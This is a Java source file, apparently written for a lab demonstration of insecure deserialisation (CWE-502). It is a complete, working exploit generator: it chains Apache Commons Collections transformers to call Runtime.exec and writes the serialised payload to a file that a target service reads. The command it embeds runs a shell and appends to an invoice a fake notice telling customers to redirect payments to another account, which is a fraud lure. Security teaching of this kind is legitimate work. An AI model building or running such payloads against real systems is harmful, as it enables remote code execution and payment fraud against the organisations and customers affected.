/**
 * PURPOSE:
 * Constructs a serialised object graph using Apache Commons Collections
 * for a controlled Java deserialisation security demonstration.
 *
 * SECURITY CONTEXT:
 * Demonstrates CWE-502: Deserialisation of Untrusted Data.
 * The payload uses existing library classes to trigger unintended
 * method calls when the Warehouse Service reconstructs the object.
 *
 * DEPENDENCIES:
 * Apache Commons Collections 3.2.1 and Java 17.
 *
 * ASSUMPTIONS:
 * The receiving application has the required library classes available
 * and deserialises incoming objects without appropriate restrictions.
 *
 * NOTE:
 * This example is intended for an isolated laboratory environment.
 * Compatibility depends on the selected Java runtime and library versions.
 *
 * RUNTIME EXECUTION NOTE:
 * Modern JREs strictly encapsulate internal collections structures (JEP 403).
 * To run this generator script and assemble the hash entries locally via Maven, 
 * you MUST explicitly open java.util module visibility using the following command:
 * 
 * mvn exec:exec -Dexec.executable="java" -Dexec.args="--add-opens java.base/java.util=ALL-UNNAMED -classpath %classpath AttackerReal"
 *
 * Note that the target Warehouse Service requires NO special flags or privileges 
 * to be exploited; it will parse the completed binary payload automatically.
 */


import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.io.IOException;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.lang.reflect.Field;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;

public class AttackerReal {

    /**
     * PURPOSE: Constructs and serialises an attacker-controlled object graph.
     * OUTPUT: Replaces the incoming-order.ser file used by the Invoice Service.
     * SECURITY: The resulting data may invoke existing application and library
     * methods during deserialisation, before the expected object type is checked.
     */
    public static void main(String[] args) {

        // ATTACK: Defines the operating-system operation that the payload
        // attempts to trigger when the Invoice Service deserialises it.

        
        /*File Manupulation Option: */
        String targetFile = "../FinanceSystem/invoices/invoice-123.txt";

        String noticeText = "\n!! IMPORTANT NOTICE !!\n"
            + "Due to a security incident involving our primary banking platform,\n"
            + "we urgently request that all customers redirect outstanding invoices\n"
            + "and upcoming payments to our temporary processing account:\n"
            + "Bank Account Number: FAKE Account\n"
            + "Sort Code: FAKE Sort Code\n";

        String[] command = new String[] {
            "/bin/sh",
            "-c",
            "printf '" + noticeText + "' >> " + targetFile
        };

        // ATTACK: Configures existing Apache Commons Collections transformers
        // to invoke methods through Java reflection.
        Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", 
                new Class[] { String.class, Class[].class }, 
                new Object[] { "getRuntime", new Class[]{} }),
            new InvokerTransformer("invoke", 
                new Class[] { Object.class, Object[].class }, 
                new Object[] { null, new Object[]{} }),
            new InvokerTransformer("exec", 
                new Class[] { String[].class }, 
                new Object[] { command })
        };

        // STEP: Use a harmless transformer during object construction to avoid
        // triggering the intended operation on the attacker's machine.
        Transformer temporaryTransformer = new ConstantTransformer(1);
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, temporaryTransformer);

        // STEP: Associate a TiedMapEntry with the LazyMap so that a hash
        // calculation can cause a lookup in the underlying map.
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "trigger-key");

        // STEP: Construct the collection that will act as the root object
        // in the serialised data.
        HashSet<Object> mapContainer = new HashSet<>(1);
        mapContainer.add("placeholder");
        
        // STEP: Modify the collection's internal structure so that
        // reconstructing it can invoke methods on the crafted entry.

        // NOTE: This relies on JDK implementation details and reflective
        // access that may be restricted by the Java module system.
        try {
            Field mapField = HashSet.class.getDeclaredField("map");
            mapField.setAccessible(true);
            HashMap<Object, Object> internalMap = (HashMap<Object, Object>) mapField.get(mapContainer);

            Field tableField = HashMap.class.getDeclaredField("table");
            tableField.setAccessible(true);
            Object[] table = (Object[]) tableField.get(internalMap);

            // Access the first node bucket within the internal structure
            Object node = null;
            for (Object o : table) {
                if (o != null) {
                    node = o;
                    break;
                }
            }

            // Replace the harmless placeholder string key with our malicious TiedMapEntry object
            Field keyField = node.getClass().getDeclaredField("key");
            keyField.setAccessible(true);
            keyField.set(node, entry);

        } catch (Exception e) {
            System.err.println("Failed to construct the structural hash entry: " + e.getMessage());
            return;
        }

        // STEP: Replace the temporary transformer after constructing
        // the object graph to avoid unintended execution during preparation.
        try {
            Field factoryField = LazyMap.class.getDeclaredField("factory");
            factoryField.setAccessible(true);
            factoryField.set(lazyMap, new ChainedTransformer(transformers));
            
            // STEP: Remove cached entries so a subsequent lookup must invoke
            // the configured transformer.
            innerMap.clear();
        } catch (Exception e) {
            System.err.println("Failed to swap transformers: " + e.getMessage());
            return;
        }

        // ATTACK: Serialise the constructed object graph to the file
        // consumed by the Invoice Service.
        try (ObjectOutputStream output = new ObjectOutputStream(
                new FileOutputStream("../FinanceSystem/incoming-order.ser"))) {

            output.writeObject(mapContainer);

            System.out.println("Exploit payload created successfully.");
            System.out.println("Saved to: ../FinanceSystem/incoming-order.ser");

        } catch (IOException e) {
            System.err.println("Failed to create payload file: " + e.getMessage());
        }
    }
}
